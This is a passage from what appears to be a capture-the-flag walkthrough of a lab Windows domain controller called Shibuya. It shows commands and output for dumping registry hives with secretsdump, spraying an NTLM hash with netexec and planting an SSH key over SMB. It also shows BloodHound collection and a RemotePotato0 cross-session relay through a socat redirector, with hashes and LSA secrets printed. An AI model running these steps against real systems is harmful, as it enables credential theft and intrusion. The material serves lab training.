PCAT/sr-Latn-RS/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 81928 17396 PCAT/sk-SK/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 80904 16465 PCAT/sv-SE/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 44880 12664 PCAT/sv-SE/memtest.exe.mui 2025-02-16 11:01:34 ....A 80392 16562 PCAT/tr-TR/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45392 12722 PCAT/tr-TR/memtest.exe.mui 2025-02-16 11:01:34 ....A 81912 17290 PCAT/uk-UA/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 42320 12280 PCAT/zh-CN/memtest.exe.mui 2025-02-16 11:01:34 ....A 66040 14878 PCAT/zh-CN/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 42320 12287 PCAT/zh-TW/memtest.exe.mui 2025-02-16 11:01:34 ....A 66056 14939 PCAT/zh-TW/bootmgr.exe.mui 2021-05-08 09:34:41 ....A 12600 6878 Resources/en-US/bootres.dll.mui 2021-05-08 08:14:24 ....A 102712 87484 Resources/bootres.dll ------------------- ----- ------------ ------------ ------------------------ 2025-02-16 11:05:50 72014980 32201982 295 files, 125 folders </span></code></pre></div></div> <h3 id="find-ntlm">Find NTLM</h3> <h4 id="dump-hashes">Dump Hashes</h4> <p>I’ll use <code class="language-plaintext highlighter-rouge">7z</code> to extract the three hives. For example, <code class="language-plaintext highlighter-rouge">7z x AWSJPWK0222-02.wim SAM</code>. Now <code class="language-plaintext highlighter-rouge">secretsdump</code> in <code class="language-plaintext highlighter-rouge">local</code> mode will dump the hashes:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>secretsdump.py <span class="nt">-sam</span> SAM <span class="nt">-security</span> SECURITY <span class="nt">-system</span> SYSTEM <span class="nb">local</span> <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6::: operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50::: [*] Dumping cached domain logon information (domain/username:hash) SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56) [*] Dumping LSA Secrets [*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e006d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900 $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42 [*] DPAPI_SYSTEM dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1 dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06 [*] NL$KM 0000 92 B9 89 EF 84 2F D6 55 73 67 31 8F E0 02 02 66 ...../.Usg1....f 0010 F9 81 42 68 8C 3B DF 5D 0A E5 BA F2 4A 2C 43 0E ..Bh.;.]....J,C. 0020 1C C5 4F 40 1E F5 98 38 2F A4 17 F3 E9 D9 23 E3 ..O@...8/.....#. 0030 D1 49 FE 06 B3 2C A1 1A CB 88 E4 1D 79 9D AE 97 .I...,......y... NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97 [*] Cleaning up... </span></code></pre></div></div> <h4 id="crack">Crack</h4> <p>Two of these hashes are the empty string (Guest and DefaultAccount). The other three are not known to <a href="https://crackstation.net/">CrackStation</a>:</p> <picture> <source type="image/webp" srcset="/img/image-20250512184127822.webp" /> <img loading="lazy" src="/img/image-20250512184127822.png" alt="image-20250512184127822" class="include_image " /> </picture> <h4 id="spray">Spray</h4> <p>I’ve got 500 users and five NTLM hashes. Of the three non-empty passwords, the operator account is most likely to be reused, then Administrator, then WDAGUtilityAccount. I’ll start by spraying the operator hash, and it gets a hit:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb shibuya.vl <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-H</span> 5d8c3d1a20bd63f60f469f6763ca0d50 <span class="nt">--continue-on-success</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\svc_autojoin:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\Leon.Warren:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\Graeme.Kerr:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\Joshua.North:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\Shaun.Burton:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\Gillian.Douglas:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE ...[snip]... </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\Keith.Wilson:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\Joan.Taylor:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\Duncan.Roberts:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\Hazel.Wright:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE ...[snip]... </span></code></pre></div></div> <p>Trying this by itself works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb shibuya.vl <span class="nt">-u</span> Simon.Watson <span class="nt">-H</span> 5d8c3d1a20bd63f60f469f6763ca0d50 <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50 </span></code></pre></div></div> <h3 id="ssh">SSH</h3> <h4 id="users-share">Users Share</h4> <p>I can’t SSH directly with an NTLM hash. But I can connect to the <code class="language-plaintext highlighter-rouge">Users</code> share:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>smbclient <span class="nt">-U</span> Simon.Watson <span class="nt">--pw-nt-hash</span> //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50 <span class="go">Try "help" to get a list of possible commands. </span><span class="gp">smb: \&gt; </span><span class="nb">ls</span> <span class="go"> . DR 0 Sun Feb 16 10:42:24 2025 .. DHS 0 Wed Apr 9 00:09:45 2025 Administrator D 0 Tue Apr 8 23:36:27 2025 All Users DHSrn 0 Sat May 8 08:34:03 2021 Default DHR 0 Sat Feb 15 15:49:13 2025 Default User DHSrn 0 Sat May 8 08:34:03 2021 desktop.ini AHS 174 Sat May 8 08:18:31 2021 nigel.mills D 0 Tue Apr 8 23:30:42 2025 Public DR 0 Sat Feb 15 06:49:31 2025 simon.watson D 0 Tue Feb 18 19:36:45 2025 5048575 blocks of size 4096. 1548067 blocks available </span></code></pre></div></div> <p>The flag is on the <code class="language-plaintext highlighter-rouge">simon.watson</code> user’s Desktop:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">smb: \simon.watson\desktop\&gt; </span><span class="nb">ls</span> <span class="go"> . DR 0 Wed Apr 9 00:06:32 2025 .. D 0 Mon May 12 23:00:44 2025 user.txt A 32 Wed Apr 9 00:06:46 2025 5048575 blocks of size 4096. 1548427 blocks available </span></code></pre></div></div> <p>I’ll create a <code class="language-plaintext highlighter-rouge">.ssh</code> directory:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">smb: \simon.watson\&gt; </span><span class="nb">ls</span> <span class="go"> . D 0 Tue Feb 18 19:36:45 2025 .. DR 0 Sun Feb 16 10:42:24 2025 AppData DH 0 Sun Feb 16 10:42:06 2025 Application Data DHSrn 0 Sun Feb 16 10:42:06 2025 Cookies DHSrn 0 Sun Feb 16 10:42:06 2025 Desktop DR 0 Wed Apr 9 00:06:32 2025 Documents DR 0 Sun Feb 16 10:42:06 2025 Downloads DR 0 Sat May 8 08:20:24 2021 Favorites DR 0 Sat May 8 08:20:24 2021 Links DR 0 Sat May 8 08:20:24 2021 Local Settings DHSrn 0 Sun Feb 16 10:42:06 2025 Music DR 0 Sat May 8 08:20:24 2021 My Documents DHSrn 0 Sun Feb 16 10:42:06 2025 NetHood DHSrn 0 Sun Feb 16 10:42:06 2025 NTUSER.DAT AHn 262144 Tue Apr 8 23:37:56 2025 ntuser.dat.LOG1 AHS 0 Sun Feb 16 10:42:06 2025 ntuser.dat.LOG2 AHS 0 Sun Feb 16 10:42:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf AHS 65536 Sun Feb 16 10:42:08 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms AHS 524288 Sun Feb 16 10:42:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms AHS 524288 Sun Feb 16 10:42:06 2025 ntuser.ini HS 20 Sun Feb 16 10:42:06 2025 Pictures DR 0 Sat May 8 08:20:24 2021 PrintHood DHSrn 0 Sun Feb 16 10:42:06 2025 Recent DHSrn 0 Sun Feb 16 10:42:06 2025 Saved Games Dn 0 Sat May 8 08:20:24 2021 SendTo DHSrn 0 Sun Feb 16 10:42:06 2025 Start Menu DHSrn 0 Sun Feb 16 10:42:06 2025 Templates DHSrn 0 Sun Feb 16 10:42:06 2025 Videos DR 0 Sat May 8 08:20:24 2021 5048575 blocks of size 4096. 1548067 blocks available </span><span class="gp">smb: \simon.watson\&gt; </span><span class="nb">mkdir</span> .ssh </code></pre></div></div> <p>Now I can put my public key into an <code class="language-plaintext highlighter-rouge">authorized_keys</code> file:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">smb: \simon.watson\&gt; </span>put /home/oxdf/keys/ed25519_gen.pub .ssh<span class="se">\a</span>uthorized_keys <span class="go">putting file /home/oxdf/keys/ed25519_gen.pub as \simon.watson\.ssh\authorized_keys (0.3 kb/s) (average 0.3 kb/s </span></code></pre></div></div> <h4 id="connect">Connect</h4> <p>I’ll use that key to connect:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen simon.watson@shibuya.vl <span class="go">Microsoft Windows [Version 10.0.20348.3453] (c) Microsoft Corporation. All rights reserved. </span><span class="gp">shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson&gt;</span><span class="w"> </span></code></pre></div></div> <p>And grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson&gt;</span><span class="kr">type</span><span class="w"> </span><span class="n">Desktop\user.txt</span><span class="w"> </span><span class="go">73531560************************ </span></code></pre></div></div> <h2 id="shell-as-nigelmills">Shell as nigel.mills</h2> <h3 id="bloodhound">Bloodhound</h3> <h4 id="collection">Collection</h4> <p>With a Shell on the box, I’ll have access to LDAP now. I’ll start the Bloodhound CE container, and go to the “Download Collectors page” to get the latest SharpHound:</p> <picture> <source type="image/webp" srcset="/img/image-20250512205409872.webp" /> <img loading="lazy" src="/img/image-20250512205409872.png" alt="image-20250512205409872" class="include_image " /> </picture> <p>I’ll download it, and <code class="language-plaintext highlighter-rouge">scp</code> it to Shibuya:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>scp <span class="nt">-i</span> ~/keys/ed25519_gen SharpHound.exe simon.watson@shibuya.vl:/programdata/ <span class="go">SharpHound.exe 100% 1255KB 1.6MB/s 00:00 </span></code></pre></div></div> <p>In the SSH session, I’ll run it, giving <code class="language-plaintext highlighter-rouge">-c all</code> to get all collection:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">shibuya\simon.watson@AWSJPDC0522 C:\ProgramData&gt;</span><span class="o">.</span><span class="n">\SharpHound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="go">2025-05-12T18:10:03.2365739-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound 2025-05-12T18:10:03.4709451-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry 2025-05-12T18:10:03.5021978-07:00|INFORMATION|Initializing SharpHound at 6:10 PM on 5/12/2025 2025-05-12T18:10:03.5490697-07:00|INFORMATION|Resolved current domain to shibuya.vl 2025-05-12T18:10:04.0021966-07:00|INFORMATION|Loaded cache with stats: 19 ID to type mappings. 1 name to SID mappings. 1 machine sid mappings. 4 sid to domain mappings. 0 global catalog mappings. 2025-05-12T18:10:04.0178213-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry 2025-05-12T18:10:04.1428215-07:00|INFORMATION|Beginning LDAP search for shibuya.vl 2025-05-12T18:10:04.3303218-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL 2025-05-12T18:10:04.3303218-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL 2025-05-12T18:10:04.3615711-07:00|INFORMATION|Beginning LDAP search for shibuya.vl Configuration NC 2025-05-12T18:10:04.5021973-07:00|INFORMATION|Producer has finished, closing LDAP channel 2025-05-12T18:10:04.5021973-07:00|INFORMATION|LDAP channel closed, waiting for consumers 2025-05-12T18:10:04.5803208-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL 2025-05-12T18:10:04.5803208-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL 2025-05-12T18:10:04.6896955-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL 2025-05-12T18:10:05.4084454-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL 2025-05-12T18:10:31.8615686-07:00|INFORMATION|Consumers finished, closing output channel Closing writers 2025-05-12T18:10:31.8771961-07:00|INFORMATION|Output channel closed, waiting for output task to complete 2025-05-12T18:10:32.0334496-07:00|INFORMATION|Status: 845 objects finished (+845 31.2963)/s -- Using 55 MB RAM 2025-05-12T18:10:32.0490728-07:00|INFORMATION|Enumeration finished in 00:00:27.9109071 2025-05-12T18:10:32.2053216-07:00|INFORMATION|Saving cache with stats: 19 ID to type mappings. 1 name to SID mappings. 1 machine sid mappings. 4 sid to domain mappings. 0 global catalog mappings. 2025-05-12T18:10:32.2053216-07:00|INFORMATION|SharpHound Enumeration Completed at 6:10 PM on 5/12/2025! Happy Graphing! </span></code></pre></div></div> <p>I’ll <code class="language-plaintext highlighter-rouge">scp</code> the results back to my host:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>scp <span class="nt">-i</span> ~/keys/ed25519_gen simon.watson@shibuya.vl:/programdata/20250512181005_BloodHound.zip <span class="nb">.</span> <span class="go">20250512181005_BloodHound.zip 100% 66KB 179.0KB/s 00:00 </span></code></pre></div></div> <p>I’ll upload this zip into Bloodhound.</p> <h4 id="analysis">Analysis</h4> <p>Red is a computer account (which explains why it couldn’t authenticate with NTLM above):</p> <picture> <source type="image/webp" srcset="/img/image-20250512210402030.webp" /> <img loading="lazy" src="/img/image-20250512210402030.png" alt="image-20250512210402030" class="include_image " /> </picture> <p>It has access to come ADCS enrollments. purple looks exactly the same.</p> <p>scv_autojoin doesn’t have any interesting outbound control other than the certificates that all users can enroll in:</p> <picture> <source type="image/webp" srcset="/img/image-20250512210535328.webp" /> <img loading="lazy" src="/img/image-20250512210535328.png" alt="image-20250512210535328" class="include_image " /> </picture> <p>simon.watson has only the same as far as outbound control. However, they also have a session on AWSJPDC0522. This isn’t surprising, as it’s likely my SSH session. Still, if I go to AWSJPDC0522 and look at it’s sessions, there’s both simon.watson and nigel.mills:</p> <picture> <source type="image/webp" srcset="/img/image-20250512210736806.webp" /> <img loading="lazy" src="/img/image-20250512210736806.png" alt="image-20250512210736806" class="include_image " /> </picture> <h3 id="cross-session-relay">Cross Session Relay</h3> <h4 id="background">Background</h4> <p><a href="https://github.com/antonioCoco/RemotePotato0">RemotePotato0</a> is an exploit to abuse the</p> <blockquote> <p>DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user). Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource. RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine.</p> </blockquote> <p>I used this same technique in <a href="/2024/03/30/htb-rebound.html#cross-session-relay">Rebound</a>.</p> <h4 id="get-session-id">Get Session ID</h4> <p>I’ll need the session ID for the target user. Typically I’d get this with <code class="language-plaintext highlighter-rouge">qwinsta</code>, but just like in Rebound, it doesn’t work:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\ProgramData&gt;</span><span class="w"> </span><span class="n">qwinsta</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="go">No session exists for * </span></code></pre></div></div> <p>That’s because I have a non-interactive session. I’ll upload <a href="https://github.com/antonioCoco/RunasCs">RunasCs.exe</a> and use it with a login type 9 login:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\ProgramData&gt; </span><span class="o">.</span><span class="n">\RunasCs.exe</span><span class="w"> </span><span class="nx">whatever</span><span class="w"> </span><span class="nx">whatever</span><span class="w"> </span><span class="nx">qwinsta</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">9</span><span class="w"> </span><span class="go"> SESSIONNAME USERNAME ID STATE TYPE DEVICE &gt;services 0 Disc rdp-tcp#0 nigel.mills 1 Active console 2 Conn rdp-tcp 65536 Listen </span></code></pre></div></div> <p>For type 9 logins it doesn’t actually check the creds, but I need to put something into those arguments. nigel.mills is connected over RDP in session ID 1.</p> <h4 id="remotepotato0-fail">RemotePotato0 Fail</h4> <p>I’ll grab the <a href="https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2">latest release</a> of <code class="language-plaintext highlighter-rouge">RemotePotato0.exe</code> and upload it via <code class="language-plaintext highlighter-rouge">scp</code>. To run this and capture the hash of the logged in user, I’ll give it mode 2 and the session id of 1:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\ProgramData&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\RemotePotato0.exe</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="go">[!] Detected a Windows Server version not compatible with JuicyPotato, you cannot run the RogueOxidResolver on 127.0.0.1. RogueOxidResolver must be run remotely. [!] Example Network redirector: sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP::9999 </span></code></pre></div></div> <p>For this version of Windows, I can’t perform this attack to localhost, so instead I have it connect to my host and then use <code class="language-plaintext highlighter-rouge">socat</code> to tunnel that back to Shibuya on the target port.</p> <p>I’ll run the <code class="language-plaintext highlighter-rouge">socat</code> command on my host just like it says:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>socat <span class="nt">-v</span> TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:9999 </code></pre></div></div> <p>It hangs, and now I’ll run <code class="language-plaintext highlighter-rouge">RemotePotato0.exe</code> with an additional <code class="language-plaintext highlighter-rouge">-x</code> parameter to give it my IP:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\ProgramData&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\RemotePotato0.exe</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-x</span><span class="w"> </span><span class="nx">10.10.14.79</span><span class="w"> </span><span class="go">[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999 [*] Example Network redirector: sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP::9999 [*] Starting the RPC server to capture the credentials hash from the user authentication!! [*] RPC relay server listening on port 9997 ... [*] Spawning COM object in the session: 1 [*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54} [*] Starting RogueOxidResolver RPC Server listening on port 9999 ... [*] IStoragetrigger written: 104 bytes </span></code></pre></div></div> <p>This hangs too. At <code class="language-plaintext highlighter-rouge">socat</code>, I get:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>socat <span class="nt">-v</span> TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:9999 <span class="go">2025/05/13 01:56:49 socat[233056] E connect(5, AF=2 10.129.234.42:9999, 16): Connection timed out </span></code></pre></div></div> <p>It’s failing to connect to port 9999 on Shibuya.</p> <h4 id="firewall-enumeration">Firewall Enumeration</h4> <p>The current filewall profile is Domain:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\ProgramData&gt;</span><span class="w"> </span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">currentprofile</span><span class="w"> </span><span class="go"> Domain Profile Settings: ---------------------------------------------------------------------- State ON Firewall Policy BlockInbound,AllowOutbound LocalFirewallRules N/A (GPO-store only) LocalConSecRules N/A (GPO-store only) InboundUserNotification Disable RemoteManagement Disable UnicastResponseToMulticast Enable Logging: LogAllowedConnections Disable LogDroppedConnections Disable FileName %systemroot%\system32\LogFiles\Firewall\pfirewall.log MaxFileSize 4096 Ok. </span></code></pre></div></div> <p>The Firewall Policy blocks inbound by default, so unless there’s a rule allowing it, it won’t get in.</p> <p>ChatGPT wrote me a little PowerShell to show me the details for the rules that are enabled, inbound, and apply to the Domain profile:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="800"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\ProgramData&gt;</span><span class="w"> </span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">rule</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="n">all</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"^Rule Name:"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="nv">$currentRule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="nv">$collect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="nv">$currentRule</span><span class="p">)</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">elseif</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">""</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="nv">$block</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$collect</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">"</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="nv">$block</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"Enabled:\s+Yes"</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="nv">$block</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"Direction:\s+In"</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="nv">$block</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"Profiles:\s+.*Domain"</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="nv">$block</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"Protocol:\s+TCP"</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="nv">$block</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">"</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span 